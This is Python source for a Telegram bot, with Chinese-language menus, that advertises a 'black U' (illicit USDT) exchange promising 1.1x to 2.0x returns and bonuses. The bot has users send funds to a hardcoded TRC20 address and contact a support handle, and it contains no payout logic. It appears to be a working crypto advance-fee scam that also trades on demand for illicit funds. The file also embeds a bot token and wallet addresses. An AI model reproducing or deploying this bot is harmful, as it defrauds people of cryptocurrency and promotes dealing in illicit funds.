# -*- coding: utf-8 -*-
import asyncio
import logging
import os
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from flask import Flask
from threading import Thread
import nest_asyncio

# 配置
BOT_TOKEN = '8424641311:AAG2fAmUNMt02yD8BAaQTuK4VleAmlMw9KQ'
RECEIVE_ADDRESS = 'TV7bNa8iJDwUhS2MQL9EpfnVWiVHiMCe1e'

# 日志
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# 存储用户会话
user_sessions = {}

# ========== 键盘定义 ==========
def get_main_keyboard():
    keyboard = [
        [InlineKeyboardButton("🧪 创建测试单", callback_data='order_test')],
        [InlineKeyboardButton("📊 创建1.1倍订单", callback_data='order_1.1x')],
        [InlineKeyboardButton("📈 创建1.5倍订单", callback_data='order_1.5x')],
        [InlineKeyboardButton("⭐️ 创建2.0倍高级订单", callback_data='order_2.0x')],
        [InlineKeyboardButton("📋 备份我的订单", callback_data='backup')],
        [InlineKeyboardButton("🤝 代理通道", callback_data='agent')],
        [InlineKeyboardButton("👨‍💻 客服中心", callback_data='support')]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_cancel_keyboard():
    keyboard = [[InlineKeyboardButton("❌ 取消", callback_data='cancel')]]
    return InlineKeyboardMarkup(keyboard)

def get_confirm_keyboard():
    keyboard = [
        [InlineKeyboardButton("✅ 确认订单", callback_data='confirm')],
        [InlineKeyboardButton("❌ 取消", callback_data='cancel')]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_back_keyboard():
    keyboard = [[InlineKeyboardButton("◀️ 返回主菜单", callback_data='back')]]
    return InlineKeyboardMarkup(keyboard)

# ========== 欢迎消息 ==========
WELCOME_MESSAGE = """✅ 您好 {name}，欢迎使用自助黑U兑换机器人

公群繁忙时，您也可以在这里自助下单，系统自动结算

❤️‍🔥 500u以上订单随机赠送本金的3%~15%

【兑换费率】
• 测试单：10u起，1.1倍
• 100-499u：1.1倍，利润10%
• 500-999u：1.5倍，利润50%+
• 1000-2999u：1.7倍，利润70%+
• 3000-9999u：1.8倍，利润80%+
• 10000-100000u：2.0倍，利润100%+

【测试单说明】
10u起（仅一单），1:1.1兑换
例：10u→11u、30u→33u、50u→55u

【黑U钱包地址】
地址1：TGT4w2vG7Ck9Ho8cxxbHj1UsURbLGCVXeq
地址2：TMDFPVbapQamkPVXLFDccyzRVxVpo5NN4S
⚠️ 此地址只出款，切勿转账，转入不退

点击下方按钮创建订单，转账后10分钟内自动回款"""

# ========== 命令处理 ==========
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_name = update.effective_user.first_name
    personalized_welcome = WELCOME_MESSAGE.replace("{name}", user_name)
    await update.message.reply_text(
        personalized_welcome,
        reply_markup=get_main_keyboard()
    )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    data = query.data

    if user_id not in user_sessions:
        user_sessions[user_id] = {}

    if data == 'order_test':
        user_sessions[user_id] = {'order_type': 'test', 'awaiting_address': True}
        await query.edit_message_text(
            "🧪 创建测试单\n\n测试单10u起，1.1倍兑换\n例：10u→11u\n\n📝 请输入您的TRC20收款地址：",
            reply_markup=get_cancel_keyboard()
        )
    elif data == 'order_1.1x':
        user_sessions[user_id] = {'order_type': '1.1x', 'awaiting_address': True}
        await query.edit_message_text(
            "📊 创建1.1倍订单\n\n100-499u，1.1倍兑换\n利润10%\n\n📝 请输入您的TRC20收款地址：",
            reply_markup=get_cancel_keyboard()
        )
    elif data == 'order_1.5x':
        user_sessions[user_id] = {'order_type': '1.5x', 'awaiting_address': True}
        await query.edit_message_text(
            "📈 创建1.5倍订单\n\n500-999u，1.5倍兑换\n利润50%+\n赠送3%-15%\n\n📝 请输入您的TRC20收款地址：",
            reply_markup=get_cancel_keyboard()
        )
    elif data == 'order_2.0x':
        user_sessions[user_id] = {'order_type': '2.0x', 'awaiting_address': True}
        await query.edit_message_text(
            "⭐️ 创建2.0倍高级订单\n\n1000-9999u，2.0倍兑换\n利润100%+\n赠送3%-15%\n\n📝 请输入您的TRC20收款地址：",
            reply_markup=get_cancel_keyboard()
        )
    elif data == 'backup':
        await query.edit_message_text("📋 备份订单\n\n功能开发中，请联系客服", reply_markup=get_back_keyboard())
    elif data == 'agent':
        await query.edit_message_text("🤝 代理通道\n\n联系客服开通代理权限：@Yong255", reply_markup=get_back_keyboard())
    elif data == 'support':
        await query.edit_message_text("👨‍💻 客服中心\n\n客服：@Yong255\n在线时间：24/7", reply_markup=get_back_keyboard())
    elif data == 'confirm':
        if user_id in user_sessions and 'user_address' in user_sessions[user_id]:
            now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            order_types = {'test': '🧪 测试单 1.1倍', '1.1x': '📊 1.1倍订单', '1.5x': '📈 1.5倍订单', '2.0x': '⭐️ 2.0倍订单'}
            order_type_text = order_types.get(user_sessions[user_id]['order_type'], '未知')
            order_text = (
                "✅ 订单创建成功！\n\n"
                f"类型：{order_type_text}\n时间：{now}\n时效：10分钟内有效\n\n"
                f"💳 请转账到\n{RECEIVE_ADDRESS}\n\n"
                f"📤 您的收款地址\n{user_sessions[user_id]['user_address']}\n\n"
                f"✅ 转账后联系客服 @Yong255"
            )
            await query.edit_message_text(order_text, reply_markup=get_back_keyboard())
            del user_sessions[user_id]
    elif data in ['cancel', 'back']:
        if user_id in user_sessions:
            del user_sessions[user_id]
        user_name = update.effective_user.first_name
        personalized_welcome = WELCOME_MESSAGE.replace("{name}", user_name)
        await query.edit_message_text(personalized_welcome, reply_markup=get_main_keyboard())

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text

    if user_id in user_sessions and user_sessions[user_id].get('awaiting_address'):
        if not text.startswith('T') or len(text) != 34:
            await update.message.reply_text(
                "❌ 地址格式错误\n\n正确格式：以T开头的34位字符\n例如：TV7bNa8iJDwUhS2MQL9EpfnVWiVHiMCe1e",
                reply_markup=get_cancel_keyboard()
            )
            return
        user_sessions[user_id]['user_address'] = text
        user_sessions[user_id]['awaiting_address'] = False
        await update.message.reply_text(
            f"📋 确认收款地址\n\n{text}\n\n确认无误后点击下方按钮",
            reply_markup=get_confirm_keyboard()
        )
    else:
        await update.message.reply_text("请点击下方按钮操作 👇", reply_markup=get_main_keyboard())

# ========== Flask 保持运行 ==========
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is running!"

@app.route('/health')
def health():
    return "OK", 200

def run_flask():
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)

async def main():
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_callback))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("🤖 机器人启动中...")
    print("客服已设置为：@Yong255")
    await application.run_polling()

if __name__ == '__main__':
    nest_asyncio.apply()
    
    # 啟動 Flask（背景執行）
    flask_thread = Thread(target=run_flask, daemon=True)
    flask_thread.start()
    
    # 啟動機器人
    asyncio.run(main())
